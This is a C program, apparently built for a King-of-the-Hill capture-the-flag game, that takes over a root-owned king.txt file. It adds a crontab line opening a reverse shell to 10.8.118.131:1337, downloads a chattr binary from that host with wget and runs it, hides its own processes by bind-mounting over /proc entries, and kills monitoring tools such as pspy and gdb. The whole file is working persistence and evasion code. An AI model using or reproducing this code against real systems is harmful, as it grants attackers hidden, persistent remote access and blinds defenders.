#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

const char* tlink = "/root/king.txt";
const char* trapcontent = "XP0S3D";
const char* trapfile = "/usr/bin/.t/.void.txt";
const char* commands[] = {
	"echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.8.118.131/1337 0>&1'\" >> /etc/crontab",
	"mkdir /usr/bin/.t && mkdir /usr/bin/.asdn0i",
	//"touch /tmp/t/void.txt",
	"wget http://10.8.118.131/chattr -O /usr/bin/.t/chattr",
	"chmod +x /usr/bin/.t/chattr",
	//"printf \"XP0S3D\" >| /tmp/t/void.txt",
	"chmod 400 /usr/bin/.t/.void.txt",
	"/usr/bin/.t/chattr +ia /usr/bin/.t/.void.txt",
	"set -o noclobber /usr/bin/.t/.void.txt"

};
const char* kill_list[] = {
	"python",
	"pspy64",
	"pspy",
	"pspy64s",
	"noclobber",
	"chattr",
	"ln",
	"modprobe",
	"gdb",
	"pwnkit",
	"nyancat"
};

const char* rm_list[] = {
	// Add more in the future
	"/usr/bin/chattr"
};


int ret;
size_t cmd_arrsize = sizeof(commands)/sizeof(commands[0]);
size_t kill_list_arrsize = sizeof(kill_list)/sizeof(kill_list[0]);
char kill_cmd[20];
char shell_hide_cmd[64];
size_t i;

void rm_tools(){
	system(rm_list[0]);
}

void killer(){
	for(i=0;i<kill_list_arrsize;i++){
		snprintf(kill_cmd,sizeof(kill_cmd),"killall %s",kill_list[i]);
		system(kill_cmd);
	}
}

void shell_hide(pid_t process){
	snprintf(shell_hide_cmd,sizeof(shell_hide_cmd),"mount -o bind /usr/bin/.asdn0i /proc/%d",process);
	system(shell_hide_cmd);
}

void traplink(){
	int fd;
	fd = open(trapfile, O_RDWR | O_CREAT | O_TRUNC, 0644);
	write(fd,trapcontent,strlen(trapcontent));
	close(fd);
	if(access(tlink, F_OK)==0){
		ret = unlink(tlink);
		if(ret!=0){
			perror("Failed to remove existing file");
		}
	}
	ret = symlink(trapfile,tlink);
	if(ret==0){
		printf("Success!\n");
	} else {
		perror("Failed to create symlink");
	}
}

void makeking(){
	pid_t usr_pid = getppid();
	pid_t script_pid = getpid();
	int traplink_called = 0;
	shell_hide(script_pid);
	shell_hide(usr_pid);
	killer();
	rm_tools();
	for(i=0;i<cmd_arrsize;i++){
		system(commands[i]);
		if(strcmp(commands[i],commands[3])==0 && !traplink_called){
			traplink();
		}
	}
}

void main(){
	makeking();
}
